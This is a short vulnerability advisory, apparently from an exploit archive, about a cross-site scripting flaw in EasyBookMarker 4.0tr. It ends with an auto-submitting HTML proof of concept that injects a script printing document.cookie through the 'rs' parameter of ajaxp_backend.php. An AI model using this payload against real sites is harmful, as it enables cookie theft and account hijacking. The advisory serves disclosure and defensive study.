@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/30304/info
+
+EasyBookMarker is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+EasyBookMarker 4.0tr is vulnerable; other versions may also be affected. 
+
+<html> <head></head> <body onLoad=javascript:document.form.submit()> <form action="http://www.example.com/zomplog/ajaxp_backend.php" method="POST" name="form"> <input type="hidden" name="rs" value="&#x22;&#x20; <script>alert(document.cookie)</script>"> </form> </body> </html>
